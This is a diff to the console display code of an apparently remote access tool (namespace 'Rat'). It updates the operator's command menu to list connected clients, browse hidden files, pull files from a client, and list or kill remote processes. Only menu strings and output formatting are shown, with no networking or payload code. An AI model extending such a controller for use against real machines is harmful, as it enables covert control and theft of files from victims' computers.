@@ -33,13 +33,14 @@ namespace Rat
     {
         std::lock_guard<std::mutex> lock(console_mutex_);
         std::cout << BOLD << YELLOW << "Available Commands:" << RESET << "\n";
-        std::cout << GREEN << "  LIST_FILES <path>        : List files/folders in <path>" << RESET << "\n";
-        std::cout << GREEN << "  READ_FILE <path>         : Read content of file at <path>" << RESET << "\n";
-        std::cout << GREEN << "  TRANSFER_FILE <path>     : Transfer file from client" << RESET << "\n";
-        std::cout << GREEN << "  LIST_PROCESSES           : List running processes" << RESET << "\n";
-        std::cout << GREEN << "  KILL_PROCESS <pid>       : Kill process with <pid>" << RESET << "\n";
-        std::cout << GREEN << "  EXIT                     : Stop server" << RESET << "\n";
-        std::cout << BOLD << "Enter command: " << RESET;
+        std::cout << GREEN << "list_clients                                   : List all client is connnecting" << RESET << "\n";
+        std::cout << GREEN << "list_files_folders <ip/id> <path_level_hidden> : List files/folders in path have level and option hidden files folders" << RESET << "\n";
+        std::cout << GREEN << "transfer_file <ip/id> <path>                   : Transfer file <path> from client have <ip/id>" << RESET << "\n";
+        std::cout << GREEN << "list_processes <ip/id>                         : List running processes from <ip/id>" << RESET << "\n";
+        std::cout << GREEN << "kill_process <pid>                             : Kill process with <pid>" << RESET << "\n";
+        std::cout << GREEN << "help                                           : List command can use" << RESET << "\n";
+        std::cout << GREEN << "exit                                           : Stop server" << RESET << "\n";
+        // std::cout << BOLD << "Enter command: " << RESET;
     }
 
     void ServerGUI::displayResult(uint64_t client_id, const std::string& ip, const std::string& command, const std::string& result) {
@@ -48,8 +49,7 @@ namespace Rat
         std::cout << BOLD << BLUE << "| Response from Client ID: " << std::setw(10) << client_id << " IP: " << ip << " |" << RESET << "\n";
         std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n";
         std::cout << BOLD << "Command: " << RESET << command << "\n";
-        std::cout << BOLD << "Result: " << RESET << "\n";
-        std::cout << result << "\n";
+        std::cout << BOLD << "Result: " << RESET << result << "\n";
         std::cout << BOLD << BLUE << "+-------------------------------------------------------------+" << RESET << "\n\n";
     }
 
